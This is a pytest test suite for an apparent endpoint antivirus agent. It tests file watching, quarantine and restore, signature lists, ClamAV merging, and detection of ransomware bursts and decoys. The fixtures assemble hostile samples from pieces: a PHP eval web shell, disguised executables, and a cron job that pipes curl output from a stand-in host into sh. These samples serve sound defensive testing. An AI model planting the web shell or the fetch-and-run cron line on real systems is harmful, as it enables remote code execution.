"""The agent's antivirus: the file watch (agent/watch.py), quarantine on the machine (agent/quarantine.py),
the shared fingerprint list's copy, and ClamAV when it is installed (the core's clamav.py).

Test files are built from pieces at run time, so no antivirus flags this repository."""
from __future__ import annotations

import hashlib
import os
import stat

import pytest

from agent import agent, quarantine, tasks, watch  # noqa: F401  (agent puts core/ on the path)
from app import clamav, procscan, signatures, threatscan

ELF = b"\x7f" + b"EL" + b"F" + b"\x02\x01\x01" + b"\0" * 57
PE = b"M" + b"Z" + b"\0" * 58 + (64).to_bytes(4, "little") + b"P" + b"E\0\0" + b"\0" * 64
SHELL = "<?php " + "ev" + "al(" + "$_P" + "OST['c']); ?>"


@pytest.fixture
def site(tmp_path, monkeypatch):
    root = tmp_path / "site"
    (root / "uploads").mkdir(parents=True)
    (root / "index.php").write_text("<?php echo 'hello'; ?>")
    monkeypatch.setenv("SENTRAI_THREAT_PATHS", str(root))
    monkeypatch.setenv("SENTRAI_CLAMAV", "off")
    return root


@pytest.fixture
def data(tmp_path):
    return tmp_path / "agent-data"


def fw(data, roots, **kw):
    return watch.FileWatch(data, roots=[str(r) for r in roots], important=kw.pop("important", []),
                           processes=kw.pop("processes", lambda: []), **kw)


# ------------------------------------------------------------------ heuristics
def test_disguised_programs_and_double_extensions(site):
    (site / "uploads" / "cat.jpg").write_bytes(ELF + b"\0" * 2000)
    (site / "uploads" / "real.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"\0" * 100)
    (site / "invoice.pdf.exe").write_bytes(PE + b"\0" * 100)
    (site / "uploads" / "tool").write_bytes(ELF + b"\0" * 100)
    got = {(os.path.basename(f["path"]), f["key"]) for f in threatscan.scan([str(site)])["findings"]}
    assert ("cat.jpg", "program-in-disguise") in got
    assert ("invoice.pdf.exe", "double-extension") in got
    assert ("tool", "program-in-uploads") in got
    assert not any(name == "real.png" for name, _ in got)


def test_packed_program_is_only_medium(site):
    (site / "app.exe").write_bytes(PE + os.urandom(64 * 1024))
    f = [x for x in threatscan.scan([str(site)])["findings"] if x["key"] == "packed-program"]
    assert f and f[0]["severity"] == "medium"


def test_md5_and_sha256_fingerprints(site):
    blob = b"harmless bytes that are on a list" * 10
    (site / "x.sh").write_bytes(blob)
    md5 = hashlib.md5(blob).hexdigest()  # noqa: S324
    r = threatscan.scan([str(site)], {"known_bad_md5": [md5]})
    assert any(f["key"] == "known-bad-hash" for f in r["findings"])


# ------------------------------------------------------------------ the full scan and quarantine
def test_scan_gives_ids_and_quarantine_round_trip(site, data):
    (site / "uploads" / "x.php").write_text(SHELL)
    ok, result, err = tasks.run_job({"id": "j-1", "kind": "threat_scan"}, data)
    assert ok, err
    f = next(x for x in result["findings"] if x["path"].endswith("x.php"))
    assert len(f["id"]) == 16 and "real_path" not in f
    target = site / "uploads" / "x.php"
    os.chmod(target, 0o640)

    ok, q, err = tasks.run_job({"id": "j-2", "kind": "quarantine", "params": {"finding": f["id"]}}, data)
    assert ok, err
    assert not target.exists() and q["id"].startswith("q-") and "original" not in q
    stored = quarantine.threats_dir(data) / "quarantine" / f"{q['id']}.bin"
    assert SHELL.encode() not in stored.read_bytes()  # scrambled: cannot run or match a scanner
    assert [x["id"] for x in quarantine.listed(data)] == [q["id"]]
    assert not any(x["path"].endswith(stored.name) for x in tasks.run_threat_scan(data)["findings"])

    target.write_text("someone put a new file here")
    ok, _, err = tasks.run_job({"id": "j-3", "kind": "restore", "params": {"item": q["id"]}}, data)
    assert not ok and "something else" in err
    target.unlink()
    ok, back, err = tasks.run_job({"id": "j-4", "kind": "restore", "params": {"item": q["id"]}}, data)
    assert ok, err
    assert target.read_text() == SHELL
    if os.name != "nt":  # Windows keeps only read-only or not
        assert stat.S_IMODE(target.stat().st_mode) == 0o640
    assert quarantine.listed(data) == []


def test_quarantine_refuses_unknown_or_changed_files(site, data):
    (site / "x.php").write_text(SHELL)
    _, result, _ = tasks.run_job({"id": "j-1", "kind": "threat_scan"}, data)
    fid = result["findings"][0]["id"]
    ok, _, err = tasks.run_job({"id": "j-2", "kind": "quarantine", "params": {"finding": "0" * 16}}, data)
    assert not ok and "not in this machine's findings" in err
    (site / "x.php").write_text(SHELL + " ")
    ok, _, err = tasks.run_job({"id": "j-3", "kind": "quarantine", "params": {"finding": fid}}, data)
    assert not ok and "changed since" in err and (site / "x.php").exists()
    ok, _, err = tasks.run_job({"id": "j-4", "kind": "restore", "params": {"item": "../etc"}}, data)
    assert not ok


def test_scan_uses_the_shared_list_copy(site, data):
    blob = b"#!/bin/sh\necho fine\n"
    (site / "run.sh").write_bytes(blob)
    signatures.save_copy(quarantine.threats_dir(data) / "signatures.json",
                         {"version": 3, "sha256": [hashlib.sha256(blob).hexdigest()]})
    keys = [f["key"] for f in tasks.run_threat_scan(data)["findings"]]
    assert "known-bad-hash" in keys


def test_clamav_finds_are_merged(site, data, monkeypatch):
    bad = site / "dropper.bin"
    bad.write_bytes(b"pretend this is bad")
    out = f"{bad}: Unix.Trojan.Example-1 FOUND\n{site / 'index.php'}: OK\n"
    calls = []
    real = clamav.scan

    def fake_scan(roots, skip=(), run=None, exe=None):
        return real(roots, skip, run=lambda cmd, t: calls.append(cmd) or (1, out), exe="/usr/bin/clamdscan")

    monkeypatch.setattr(tasks.clamav, "scan", fake_scan)
    r = tasks.run_threat_scan(data)
    f = next(x for x in r["findings"] if x["key"] == "clamav")
    assert f["label"] == "ClamAV: Unix.Trojan.Example-1" and f["severity"] == "critical" and f["id"]
    assert r["engines"] == ["sentrai", "clamdscan"] and "--fdpass" in calls[0]


def test_clamav_off_or_missing(monkeypatch):
    monkeypatch.setenv("SENTRAI_CLAMAV", "off")
    assert clamav.find() is None
    assert clamav.scan(["/tmp"]) == {"engine": None, "findings": []}
    assert clamav.scan(["/tmp"], run=lambda c, t: (2, ""), exe="/x/clamscan")["error"]


# ------------------------------------------------------------------ the file watch
def test_watch_learns_first_then_flags_new_files(site, data):
    w = fw(data, [site])
    assert w.tick() == []  # the first look only learns what is there
    (site / "uploads" / "x.php").write_text(SHELL)
    (site / "uploads" / "photo.jpg").write_bytes(ELF + b"\0" * 100)
    found = w.tick()
    keys = {f["key"] for f in found}
    assert {"php-eval-request", "program-in-disguise"} <= keys
    assert all(f["source"] == "watch" for f in found)
    assert w.tick() == []  # nothing changed since


def test_watch_uses_shared_fingerprints(site, data):
    blob = b"some file the fleet already knows"
    w = fw(data, [site], hashes=lambda: {hashlib.sha256(blob).hexdigest()})
    w.tick()
    (site / "notes.dat").write_bytes(blob)  # an extension the scan does not read: the fingerprint still counts
    assert [f["key"] for f in w.tick()] == ["known-bad-hash"]


def test_ransomware_burst_and_renames(site, data):
    docs = site / "docs"
    docs.mkdir()
    for n in range(25):
        (docs / f"report{n}.txt").write_text("quarterly numbers " * 50)
    w = fw(data, [site])
    w.tick()
    for n in range(25):  # rewritten into scrambled data and renamed, as ransomware does
        p = docs / f"report{n}.txt"
        (docs / f"report{n}.txt.locked").write_bytes(os.urandom(2048))
        p.unlink()
    (docs / "HOW_TO_DECRYPT_FILES.txt").write_text("pay us")
    found = w.tick()
    burst = [f for f in found if f["key"] == "ransomware-burst"]
    assert burst and burst[0]["severity"] == "critical" and len(burst[0]["examples"]) == 5
    assert "restore from its latest backup" in burst[0]["label"]
    note = [f for f in found if f["key"] == "ransom-note"]
    assert note and note[0]["severity"] == "critical"


def test_a_few_compressed_changes_are_not_ransomware(site, data):
    w = fw(data, [site])
    w.tick()
    for n in range(30):
        (site / f"b{n}.zip").write_bytes(os.urandom(2048))
    assert not [f for f in w.tick() if f["kind"] == "ransomware"]


def test_decoys(site, data, monkeypatch):
    monkeypatch.setenv("SENTRAI_DECOYS", "on")
    w = fw(data, [site])
    w.tick()
    decoy = site / watch.DECOY_NAME
    assert decoy.exists()
    assert w.tick() == []
    decoy.write_bytes(os.urandom(512))
    found = w.tick()
    assert [f["key"] for f in found] == ["decoy-touched"] and found[0]["severity"] == "critical"
    assert decoy.read_text().startswith("This file was placed by SentrAI")  # placed again for next time


def test_important_files_baseline_survives_restarts(tmp_path, data):
    ssh = tmp_path / "home" / "erick" / ".ssh"
    ssh.mkdir(parents=True)
    keys = ssh / "authorized_keys"
    keys.write_text("ssh-ed25519 AAAA erick@laptop\n")
    cron = tmp_path / "cron.d"
    cron.mkdir()
    imp = [("high", "SSH login keys", [str(tmp_path / "home" / "*" / ".ssh" / "authorized_keys")]),
           ("high", "scheduled jobs", [str(cron)])]
    assert fw(data, [], important=imp).tick() == []  # first run: the baseline
    keys.write_text("ssh-ed25519 AAAA erick@laptop\nssh-ed25519 BBBB someone-else\n")
    job = cron / "update"
    job.write_text("*/5 * * * * root " + "cu" + "rl -s http://example.test/x | " + "sh\n")
    found = fw(data, [], important=imp).tick()  # a new agent process: the baseline came from disk
    labels = {(f["key"], f["label"]) for f in found}
    assert ("watched-file-changed", "SSH login keys changed") in labels
    assert ("watched-file-changed", "new file in scheduled jobs") in labels
    assert any(f["key"] == "cron-fetch" for f in found)  # the new cron line is read with the signatures
    changed = next(f for f in found if f["label"] == "SSH login keys changed")
    assert changed["old"] and changed["new"] and changed["old"] != changed["new"] and changed["severity"] == "high"
    job.unlink()
    gone = fw(data, [], important=imp).tick()
    assert [f["key"] for f in gone] == ["watched-file-removed"]


def test_hostile_programs_once(data):
    procs = [procscan.Proc(pid=4242, name="xmrig", exe="/tmp/.x/xmrig", cmdline=["xmrig", "-o", "pool"], user="www-data")]
    w = fw(data, [], processes=lambda: procs, clock=lambda: 1000.0)
    found = w.tick()
    assert found and found[0]["kind"] == "process" and "pid 4242" in found[0]["label"]
    w.next_procs = 0
    assert w.tick() == []  # the same program is told once


def test_remember_gives_ids_only_to_files_that_can_be_moved(tmp_path, data):
    f = tmp_path / "a.php"
    f.write_text("x")
    rows = quarantine.remember(data, [{"real_path": str(f), "sha256": "ab" * 32, "path": "~/a.php"},
                                      {"real_path": None, "sha256": "cd" * 32, "path": "~/docs", "key": "ransomware-burst"}])
    assert rows[0]["id"] == quarantine.finding_id(str(f), "ab" * 32) and "id" not in rows[1]
    assert all("real_path" not in r for r in rows)


def test_signature_copy_fetch(data):
    class R:
        def __init__(self, code, body):
            self.status_code, self._b = code, body

        def json(self):
            return self._b

    class S:
        def __init__(self, answers):
            self.answers, self.params = answers, []

        def get(self, url, params=None, **kw):
            self.params.append(params)
            return self.answers.pop(0)

    copy = watch.SignatureCopy(data)
    s = S([R(200, {"version": 2, "sha256": ["ab" * 32], "md5": ["cd" * 16]}), R(200, {"version": 2, "unchanged": True})])
    assert copy.fetch({"panel": "https://p", "key": "k"}, s, True) is None
    assert copy.hashes() == {"ab" * 32, "cd" * 16}
    assert copy.fetch({"panel": "https://p", "key": "k"}, s, True) is None
    assert s.params == [None, {"have": 2}] and copy.hashes() == {"ab" * 32, "cd" * 16}


def test_status(data, site):
    st = watch.status(data)
    assert st["watch"] == "on" and st["fingerprints"] == 0 and st["quarantined"] == 0
